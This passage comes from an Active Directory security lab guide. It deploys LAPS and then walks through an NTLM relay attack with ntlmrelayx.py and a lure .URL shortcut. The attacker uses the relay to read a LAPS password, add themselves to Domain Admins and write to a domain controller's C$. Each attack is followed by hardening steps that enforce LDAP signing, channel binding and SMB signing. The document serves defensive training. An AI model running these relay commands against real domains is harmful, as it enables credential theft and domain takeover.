1. [] In the **Find Users, Contacts, and Groups**, in the **Name** field type `blue` and click **Find Now**. In the **Search results** section, right click on **Mr Blue** account and select **Add to a group...**. 

1. [] In the **Select Groups**, type the name `Schema admins`, click **Check Names** and then **OK**. In the confirmation pop-up click **OK**.

    >[!knowledge] You need to sign out and sign in again for that group membership to be effective within your session.

1. [] Close the session and reopen it with the same credentials
    |||
    |:--------|:--------|
    | Username | `CONTOSO\blue` |
    | Password | Please type the password |

1. [] Open a **File Explorer** and navigate to `C:\Tools`. Double click on **LAPS.x64**. This starts the installation wizard.

1. [] In the **Local Administrator Password Solution Setup** window, click **Next**. Read the full end-user license agreement. Who knows, maybe there's a joke or something hidden in the middle. Once you're done click **I accept the terms in the License Agreement** and click **Next**. Make sure all the components are installed locally. Click on the icon in front of **Management Tools** and select **Entire feature will be installed on local hard drive**:
![image](.\IMG\LAPSi.png)

    Click **Next** and **Install**. Once the **User Account Control** popup shows up, click **Yes**. And then click **Finish**.

1. [] Right click on the Start menu ![image](.\IMG\2022menu.png) and click on **Command Prompt (Admin)** and click **Yes** in the pop-up.

1. [] In **Command prompt**, run the following to switch to a PowerShell prompt as an admin `powershell`.

1. [] Run the following: 

    ```
    Import-module AdmPwd.PS
    Update-AdmPwdADSchema
    ```
    📝 What are the added two attributes?

    📝 On which class of object these attributes will be available?

    The schema is now up to date:
    ![image](.\IMG\LAPSs.png)

### Task 2 - Prepare the domain

The forest is now ready to go on with the deployment of LAPS. You will create a group to delegate the access of the local admin password on the OU. 

1. [] Still logged on **@lab.VirtualMachine(DC01).SelectLink** with the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\blue` |
    | Password | Please type the password |

1. [] Right click on the Start menu ![image](.\IMG\2022menu.png) and click on **Run**.

1. [] In the **Run** window, type `dsa.msc` and click **OK**.

1. [] In the **Active Directory Users and Computers**, expand the domain **contoso.com** and right click on **_Admins** and click **New** then **Group**.

1. [] In the **New Object - Group**, type the name `Server Admins` and click **OK**.

1. [] If you closed the prompt from the previous task, re-open it by right clicking on the Start menu ![image](.\IMG\2022menu.png) and click on **Command Prompt (Admin)** and click **Yes** in the pop-up. Then run the following to switch to a PowerShell prompt as an admin `powershell`.

1. [] In rhw **Command prompt** running PowerShell, run the following: `Set-AdmPwdComputerSelfPermission -Identity "Servers"`

    This will allow computers to access and change their own passwords

1. [] In the same prompt `Set-AdmPwdReadPasswordPermission -Identity "Servers" -AllowedPrincipals "Server Admins"`

    The group **Server Admins** will be able to able read the LAPS passwords of all computer accounts under the **Servers** OU as long as the LAPS binaries are deployed on the machines.
    
    We will drop the msi file in a place we can access from **SRV01**.

1. [] Open a **File Explorer** window, navigate to `C:\Tools`, right click on **LAPS.x64** and select **Copy**. Then navigate to `C:\Windows\SYSVOL\domain\scripts` and paste the file there. You will be prompted to confirm the operation and click **Continue**.

1. [] Right click on the Start menu ![image](.\IMG\2022menu.png) and click on **Run**.

1. [] In the **Run** window, type `gpmc.msc` and click **OK**.

1. [] In the **Group Policy Management** window, navigate to **Group Policy Management** > **Forest: contoso.com** > **Domain** > **contoso.com**. Right click on the **Servers** OU and click **Create a GPO in this domain, and Link it here...**. Call the policy `LAPS settings` and click **OK**.

1. [] Right click on the GPO you have just created and click **Edit**.

1. [] In the **Group Policy Management Editor** window, right click on the top node **LAPS Setting [DC01.contoso.com]** and click **Properties**. Check the checkbox **Disable User Configuration Settings**, confirm by clicking **Yes** and click **OK**. We disable that section because there will be no user settings in this policy.

1. [] Then navigate **LAPS Setting [DC01.contoso.com]** > **Computer Configuration** > **Policy** > **Administrative Templates** > **LAPS**. Double click on **Enable local admin password management**, click **Enabled** and click **OK**.

1. [] Double click on the setting called **Password Settings**. Enable the setting with the default complexity.

    📝 What is default password length for the password?

    Click **OK** and close the **Group Policy Management Editor** window.

### Task 3 - Deploy LAPS manually on SRV01

Now you are goin

1. [] Still logged on **@lab.VirtualMachine(SRV01).SelectLink** with the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\blue` |
    | Password | Please type the password |

1. [] Open a **File Explorer** window, navigate to `\\contoso.com\NETLOGON`. Double click on **LAPS.x64**, click **Run**, click **Next**, no need to read that license agreement again right? Click the checkbox and click **Next**. Leave the default settings:
![image](.\IMG\LAPSic.png)
Click **Next** then **Install**. Then click **Finish**.

1. [] Right click on the Start menu ![image](.\IMG\2022menu.png) and click on **Windows PowerShell (Admin)**.

1. [] In the PowerShell prompt, run `gpupdate`. 

    This will refresh the group policies and trigger the password change and registration into AD DS.

1. [] <font style="color:blue;">**Mister Blue**</font>, since you are a domain admin, you should have the permission to read the password from AD DS. Let's try. From the same prompt, run the following command: `Get-ADComputer -Identity SRV01 -Properties "ms-Mcs-AdmPwd"`. You should see something like this (of course with a different password):
![image](.\IMG\LAPSF.png)

From now on, all servers in this OU which have the LAPS binaries installed will generate a random password every 30 days and store it into a confidential attribute in AD DS.


===

## Exercise 8 - Abuse NTLM authentication protocol [optional]

In this exercise <font style="color:red;">**Miss Red**</font> will attempt to perform an NTLM relay attack to impersonate Katrina's account against AD DS.

### Task 1 - Prepare the attack

Hello <font style="color:red;">**Miss Red**</font>. Let's start a fake HTTP service with the only objective to perform an NTLM relay attack against AD DS using LDAP.

1. [] Log on **@lab.VirtualMachine(CLI01).SelectLink** with the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\red` |
    | Password | Please type the password |

1. [] Right click on the Start menu ![image](.\IMG\11menu.png) and select **Windows Terminal (Admin)**.

1. [] In the **Windows Terminal (Admin)** window, change the local directory `cd \Tools\Scripts`.

    We want to run the **ntlmrelayx.py** script to listen on a fake HTTP service and relay all connections to AD and open an LDAP interactive shell. 

1. [] Execute the following command `python.exe ntlmrelayx.py --no-smb-server --no-raw-server --no-wcf-server -i -t ldap://dc01`

    It starts to listen on connections on port 80. Leave that running.

    <details><summary>❓ Why the --no-smb-server? **Click here to see the answer**.</summary>
        The **--no-smb-server** parameter tells the script not to listen on the SMB port. Windows already listen on the port TCP 445 for SMB traffic. If you do not specify this parmeter, the script will complain about it. If you want to give it a try, you could stop and disable the Server service and restart the machine. Then you can use the script on the SMB port as it will no longer conflict with Windows.
        </details> 

    Now you are going to create a shortcut file to trick a user into clicking it... You will then place it on SRV01...

1. [] Right clicking on the Start menu ![image](.\IMG\11menu.png) and click on **Run**.

1. [] In the **Run** window, type `notepad.exe` and **OK**.

1. [] In the **Untitled - Notepad** window, enter the following:
    ```
    [{000214A0-0000-0000-C000-000000000046}]
    Prop3=19,2
    [InternetShortcut]
    IDList=
    URL=http://cli01.contoso.com/
    IconIndex=234
    HotKey=0
    IconFile=C:\Windows\System32\SHELL32.DLL
    ```

1. [] Click on **File** then **Save**. Navigate to `C:\Users\Public`, in the **File name** field type `DO NOT CLICK.URL `and in the **Save as type** pick **All files (\*,\*)**. Click **Save**.

    ⚠️ Do not double click on the file you just created, that's intended to de clicked only by the victim.

1. [] Right clicking on the Start menu ![image](.\IMG\11menu.png) and click on **Run**.

1. [] In the **Run** window, type `runas /user:connie.flores@contoso.com cmd.exe` and **OK**. When prompted, use the following password `NeverTrustAny1!`. 

    >[!help] The password will not show in the prompt. Once you have clicked on the ![image](.\IMG\ntw2poa5.jpg) in front of the password, hit the Enter key to validate the input. 

    This has open a new command prompt but as **Connie**.

1. [] In the new prompt called **cmd.exe (running as connie.flores@contoso.com)** run the following `copy "C:\Users\Public\DO NOT CLICK.URL" \\SRV01\C$`

Now we wait...


### Task 2 - Relay an authentication

In this task, you will start by playing the role of Katrina.

It is a beautiful day and Katrina has decided to do some administration work.

1. [] Log on **@lab.VirtualMachine(DC02).SelectLink** with the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\katrina.mendoza.adm` |
    | Password | Please type the password |

1. [] Open a new **File Explorer** window. In the address bar, type `\\SRV01\c$`. This is what you see:
![image](.\IMG\HU2.png)

    🤔 Hum... A file called DO NOT CLICK... What should you do.

1. [] Double click on **DO NOT CLICK**.
    And... Nothing happens...
![image](.\IMG\RELAY404.png)
The page doesn't exist. So you continue your day...

    <details><summary>❓ Wait... Why wasn't I even prompted? **Click here to see the answer**.</summary>
    The fake website address is cli01.contoso.com. And Contoso like many other companies, has a policy that allows SSO with intranet websites. That's something you can check in the **Internet Options** of the machine.
    </details> 

    Time for <font style="color:red;">**Miss Red**</font> to check what Katrina has really done.

1. [] Go back **@lab.VirtualMachine(CLI01).SelectLink** with the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\red` |
    | Password | Please type the password |

1. [] In your **Windows Terminal (Admin)** window, you should see the following:
![image](.\IMG\NTLMRELAYs.png)

    You can see that the message indicates that an interactive shell was starting.
    
    📝 On what IP and which port the interactive shell has started?

1. [] Right clicking on the Start menu ![image](.\IMG\11menu.png) and click on **Run**.

1. [] In the **Run** window, type `ncat 127.0.0.1 11000` and click **OK**.

1. [] In the **C:\Program File (x86)\Nmap\ncat.exe** window run `help` to get the list of commands. Then type `get_laps_password SRV01$`.
Here you go, you have the password of the default local admin of SRV01. Let's play a joke on <font style="color:blue;">**Mister Blue**</font> and add yourself to the **Domain Admins** group. Run the following: `add_user_to_group red "domain admins"`.
Here you go, your own account is now a member of the domain admins group:
![image](.\IMG\DA.png)

1. [] Close the **ncat** window.

1. [] In your **Windows Terminal (Admin)** window, hit **Ctrl** + **C** to terminate the **ntlmrelayx** script execution.

It's time to tell <font style="color:blue;">**Mister Blue**</font> you owned another account and added yourself to domain admins.

### Task 3 - Enforce LDAP signing

Hello <font style="color:blue;">**Mister Blue**</font>. Well, it seems that the attack was possible because of multiple factors:
1. The user clicked where she shouldn't have, maybe a bit of user training is a good idea
2. NTLM was enabled for an admin account
3. Signing was not enforce on the LDAP component of the domain controller

For 1, well go train your admins. For 2, we have seen some mitigation already. For 3, let's enforce LDAP signing.

1. [] Log on **@lab.VirtualMachine(DC01).SelectLink** with the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\blue` |
    | Password | Please type the password |

    Let's start by removing **CONTOSO\red** from the **Domain Admins** group...

1. [] Right click on the Start menu ![image](.\IMG\2022menu.png) and click on **Run**.

1. [] In the **Run** window, type `dsa.msc` and click **OK**. 

1. [] In the **Active Directory Users and Computers** console, right click on the domain name **contoso.com ** and click **Find...**. 

1. [] In the **Find Users, Contacts, and Groups** window, type `red` in teh **Name** field and click **Find Now**. In the results section, double click on the **Miss Red**, select the **Member Of** tab, select **Domain Admins** from the list of groups and click **Remove**, then **Yes** to confirm and then **OK** to close the **Miss Red Properties** window.

1. [] Close the **Find Users, Contacts, and Groups** window and then close the **Active Directory Users and Computers** console.

    Now let's enforce LDAP signing.

1. [] Right click on the Start menu ![image](.\IMG\2022menu.png) and click on **Run**.

1. [] In the **Run** window, type `gpmc.msc` and click **OK**. 

1. [] In the **Group Policy Management** window, navigate to **Group Policy Management** > **Forest: contoso.com** > **Domain** > **contoso.com** > **Domain Controllers**. Right click on **Default Domain Controller Policy** and click **Edit**.

1. [] In the **Group Policy Management Editor** window, navigate **Default Domain Controller Policy [DC01.contoso.com]** > **Computer Configuration** > **Policies** > **Windows Settings** > **Security Settings** > **Local Policies** > **Security Options**. Double click on **Domain controller: LDAP server signing requirements**. Then click **Define this policy setting**, pick **Require signing** from the drop down menu, and click **OK**.

1. [] Close the **Group Policy Management Editor** window and then close the **Group Policy Management** window.

    <details><summary>❓ Wait... That's it, why not do it all the time? **Click here to get some insights**.</summary>
    That's easy to do but in practice it is often difficult for customers to implement signing. Clients not compatible with signing, or not using an authentication method that supports signing (like an LDAP simple bind) will no longer be able to connect to the domain controllers. Be very caution when you enable this and make sure you enabled the appropriate auditing before.
    See here for more info 🔗[How to enable LDAP signing in Windows Server](https://docs.microsoft.com/en-usHow%20to%20enable%20LDAP%20signing%20in%20Windows%20Server%20/troubleshoot/windows-server/identity/enable-ldap-signing-in-windows-server)
    </details> 

1. [] Before putting it to the test, we need to refresh the group policy on the domain controller. Unlike regular servers which refresh policy every 90 minutes (+/- 30 minutes) domain controllers refresh their policies every 5 minutes. But eh, you're not patient so let's right click on the Start menu ![image](.\IMG\2022menu.png) and click on **Run**.

1. [] In the **Run** window, type `gpupdate` and click **OK**. 

Time for <font style="color:red;">**Miss Red**</font> to try again...

### Task 4 - Try again to relay Katrina's connection

Hi <font style="color:red;">**Miss Red**</font>, time to check if what <font style="color:bluered;">**Mister Blue**</font> did is blocking you or not...

1. [] Log back on **@lab.VirtualMachine(CLI01).SelectLink** with the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\red` |
    | Password | Please type the password |

1. [] In a **Windows Terminal (Admin)** window set in the following directory **C:\Tools\Scripts**, execute the following command `python.exe ntlmrelayx.py --no-smb-server --no-raw-server --no-wcf-server -i -t ldap://dc01`

    Let's try Katrina again.

1. [] Go back on **@lab.VirtualMachine(DC02).SelectLink** with the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\katrina.mendoza.adm` |
    | Password | Please type the password |

1. [] You should still have the **File Explorer** window open at the address **\\SRV01\c$**. Double click on the **DO NOT CLICK** file. It should still be the following:
![image](.\IMG\RELAY404.png)

1. [] Log back on **@lab.VirtualMachine(CLI01).SelectLink** with the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\red` |
    | Password | Please type the password |

1. [] Look at the **Windows Terminal (Admin)** window. This time it failed:
![image](.\IMG\LDAPRF.png)

    Well, let's try to do what the output is suggesting... Using LDAPS.

1. [] In your **Windows Terminal (Admin)** window, hit **Ctrl** + **C** to terminate the **ntlmrelayx** script execution. Then execute `python.exe ntlmrelayx.py --no-smb-server --no-raw-server --no-wcf-server -i -t ldaps://dc01.contoso.com`

1. [] Go back on **@lab.VirtualMachine(DC02).SelectLink** with the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\katrina.mendoza.adm` |
    | Password | Please type the password |

1. [] Refresh the **Edge** window (it should still be the address `http://cli01.contoso.com`).

1. [] Then go back on **@lab.VirtualMachine(CLI01).SelectLink**. You see the NTLM relay attack worked just fine:
![image](.\IMG\LDAPRS.png)

    Forcing signing in that case did not affect the connection made over TLS. 
    Enforcing LDAP Signing is not enough. You also need to enforce what is called the Channel Binding Token for LDAPS connections.

### Task 5 - Enforce LDAPS channel binding token

This time you are going to do things on **DC02**. We will see why a bit later.

1. [] Log on **@lab.VirtualMachine(DC02).SelectLink** with the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\blue` or `CONTOSO\katrina.mendoza.adm`|
    | Password | Please type the password |


1. [] Right click on the Start menu ![image](.\IMG\2022menu.png) and click on **Run**.

1. [] In the **Run** window, type `gpmc.msc` and click **OK**. 

1. [] In the **Group Policy Management** window, navigate to **Group Policy Management** > **Forest: contoso.com** > **Domain** > **contoso.com** > **Domain Controllers**. Right click on **Default Domain Controller Policy** and click **Edit**.

1. [] In the **Group Policy Management Editor** window, navigate **Default Domain Controller Policy [DC01.contoso.com]** > **Computer Configuration** > **Policies** > **Windows Settings** > **Security Settings** > **Local Policies** > **Security Options**. Double click on **Domain controller: LDAP server channel binding token requirements**. Pick **Always** from the drop down menu, and click **OK**.

    >[!knowledge] If you do not see this option, you might be connected to DC01 and not DC02. DC01 is missing security updates in your lab. Hence the option isn't there. That's why we do that on DC02. Note that the GPMC console can be pointing to DC01 that's fine. But the console has to be opened from DC02 in your lab.

1. [] Close the **Group Policy Management Editor** window.

    Like for LDAP Signing, the impact might be considerable on legacy applications and a thorough audit needs to be conducted before enabling this. But without this, look at how easy it was to workaround the signing requirement for LDAP with your NTLM relay attack...

    <details><summary>❓  Why are we doing that on DC02? **Click here to see the answer**.</summary>
    **DC02** is a **Windows Server 2022** with all security updates up to August 2022. **DC01** is a **Windows Server 2016** which has not seen security updates in a very long time because the admin of the server did not believe in security updates. Go figure... As a result, **DC01** is missing the update allowing it to 1 see the setting when you edit a GPO, 2 apply the setting when it is set through GPO. The good solution would be to update **DC01**, but eh. Lazy.
    </details> 

If you want to check if that protection worked, you can run the following from **CLI01**: `python.exe ntlmrelayx.py --no-smb-server --no-raw-server --no-wcf-server -i -t ldaps://dc02.contoso.com` and try to connect with Katrina again.

    📝 What is the error message?

### Task 6 - Try again to relay Katrina's connection

<font style="color:red;">**Miss Red**</font>, it looks like <font style="color:bluered;">**Mister Blue**</font> is not taking you seriously.

1. [] Log back on **@lab.VirtualMachine(CLI01).SelectLink** with the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\red` |
    | Password | Please type the password |

1. [] In your **Windows Terminal (Admin)** window, hit **Ctrl** + **C** to terminate the **ntlmrelayx** script execution.

1. [] Then execute `python.exe ntlmrelayx.py --no-smb-server --no-raw-server --no-wcf-server -i -t smb://192.168.1.11 -smb2support --remove-mic`

    This time it is an NTLM relay to the SMB server of DC01, not LDAP. So this time if SMB Signing is not enforce on the server side, you'll get an easy access too 😎

1. [] Quickly stop by **@lab.VirtualMachine(DC02).SelectLink** with the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\katrina.mendoza.adm` |
    | Password | Please type the password |

1. [] Refresh the **Edge** window (it should still be the address `http://cli01.contoso.com`).

1. [] Then go back on **@lab.VirtualMachine(CLI01).SelectLink**. And have a look at the terminal:
![image](.\IMG\SMBOWNED.png)

1. [] Right clicking on the Start menu ![image](.\IMG\11menu.png) and click on **Run**.

1. [] In the **Run** window, type `ncat 127.0.0.1 11000` and click **OK**.

1. [] In the **C:\Program File (x86)\Nmap\ncat.exe** window run `shares`. This display all available share. Let's get into **C$**, run `use c$` then run `mkdir IWASTHERE`. Now list all the files and folders in the share with `ls`.
You can see your new folder of the C drive of the DC:
![image](.\IMG\shellsmb.png)

How to block this one? Well simple. Like we enforced LDAP signing, <font style="color:bluered;">**Mister Blue**</font> will have to enable SMB signing.

### Task 7 - Enforce SMB Signing

<font style="color:bluered;">**Mister Blue**</font>, it seems that <font style="color:red;">**Miss Red**</font> is always one step ahead. You blocked relay attack on LDAP, but not on the SMB service (the file server service). And this time the scope of the risk is bigger. The LDAP service is available only on domain controllers. But the file server service, it might be on pretty much all machines. So, to stop the attack everywhere, let's enforce the SMB signing on all systems.

1. [] Log on **@lab.VirtualMachine(DC01).SelectLink** with the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\blue` |
    | Password | Please type the password |

    Let's start by removing **CONTOSO\red** from the **Domain Admins** group...

1. [] Right click on the Start menu ![image](.\IMG\2022menu.png) and click on **Run**.

1. [] In the **Run** window, type `dsa.msc` and click **OK**. 

1. [] In the **Active Directory Users and Computers** console, right click on the domain name **contoso.com** and click **Find...**. 

1. [] In the **Find Users, Contacts, and Groups** window, type `red` in the **Name** field and click **Find Now**. In the results section, double click on the **Miss Red**, select the **Member Of** tab, select **Domain Admins** from the list of groups and click **Remove**, then **Yes** to confirm and then **OK** to close the **Miss Red Properties** window.

1. [] Close the **Find Users, Contacts, and Groups** window and then close the **Active Directory Users and Computers** console.

    Now let's enforce LDAP signing.

1. [] Right click on the Start menu ![image](.\IMG\2022menu.png) and click on **Run**.

1. [] In the **Run** window, type `gpmc.msc` and click **OK**. 

1. [] In the **Group Policy Management** window, navigate to **Group Policy Management** > **Forest: contoso.com** > **Domain** > **contoso.com**. Right click on **Default Domain Policy** and click **Edit**.

1. [] In the **Group Policy Management Editor** window, navigate **Default Domain Controller Policy [DC01.contoso.com]** > **Computer Configuration** > **Policies** > **Windows Settings** > **Security Settings** > **Local Policies** > **Security Options**. Double click on **Microsoft network server: Digitally sign communications (always)**. Then click **Define this policy setting**, select **Enabled** and click **OK**.

1. [] Close the **Group Policy Management Editor** window and the **Group Policy Management** console.

**⚠️ Can you break stuff doing that?**

**Absolutely!** But that's the price to pay to get rid of these relay attacks. And in 2022 (or whatever century you run this lab in), if your apps and appliances don't support SMB signing, you should really update them or get rid of them.

**BUT** it is super important to push for that configuration in you want to defeat NLTM relay attacks.

===

🍾 Congratulations! You have completed the labs for this chapter.

**Make sure you have noted all the answers to the questions marked with 📝.** 